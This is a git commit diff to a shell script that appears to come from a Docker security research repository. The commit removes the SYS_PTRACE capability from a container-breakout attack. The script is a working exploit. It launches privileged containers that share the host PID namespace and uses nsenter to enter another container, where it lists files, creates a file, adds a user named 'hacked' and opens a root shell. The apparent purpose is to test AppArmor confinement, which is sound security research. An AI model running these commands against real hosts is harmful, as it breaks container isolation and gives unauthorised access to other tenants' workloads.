3eee30756e110e30646ab98155a40c392e47a6eb
Ubuntu <ubuntu@docker-security39.novalocal>
2019-01-30 22:31:53 +0000

    Omitted capability SYS_PTRACE

--- Attacks/Nsenter/Breakout_to_Other_Container/privileged_actions/2_run_attacker_to_container.sh
+++ Attacks/Nsenter/Breakout_to_Other_Container/privileged_actions/2_run_attacker_to_container.sh
@@ -11,19 +11,19 @@ container_pid=$(cat PID)
 
 #List contents of container's root directory
 echo "====== ls / ======"
-docker run --rm -it --security-opt "apparmor=attacker_profile" --pid=host --cap-add SYS_PTRACE --cap-add SYS_ADMIN debian:latest nsenter --target ${container_pid} --mount ls /
+docker run --rm -it --security-opt "apparmor=attacker_profile" --pid=host --cap-add SYS_ADMIN debian:latest nsenter --target ${container_pid} --mount ls /
 
 #Touch a new file in container's root directory
 echo "====== touch HelloFromTheOtherSide ======"
-docker run --rm -it --security-opt "apparmor=attacker_profile" --pid=host --cap-add SYS_PTRACE --cap-add SYS_ADMIN debian:latest nsenter --target ${container_pid} --mount touch HelloFromTheOtherSide
+docker run --rm -it --security-opt "apparmor=attacker_profile" --pid=host --cap-add SYS_ADMIN debian:latest nsenter --target ${container_pid} --mount touch HelloFromTheOtherSide
 
 #Add a new user in the container
 echo "====== useradd hacked ======"
-docker run --rm -it --security-opt "apparmor=attacker_profile" --pid=host --cap-add SYS_PTRACE --cap-add SYS_ADMIN debian:latest nsenter --target ${container_pid} --mount /usr/sbin/useradd hacked
+docker run --rm -it --security-opt "apparmor=attacker_profile" --pid=host --cap-add SYS_ADMIN debian:latest nsenter --target ${container_pid} --mount /usr/sbin/useradd hacked
 
 #Create a shell in the container
 echo "====== /bin/bash ======"
-docker run --rm -it --security-opt "apparmor=attacker_profile" --pid=host --cap-add SYS_PTRACE --cap-add SYS_ADMIN debian:latest nsenter --target ${container_pid} --mount /bin/bash
+docker run --rm -it --security-opt "apparmor=attacker_profile" --pid=host --cap-add SYS_ADMIN debian:latest nsenter --target ${container_pid} --mount /bin/bash
 
 #Clear files
 rm PID
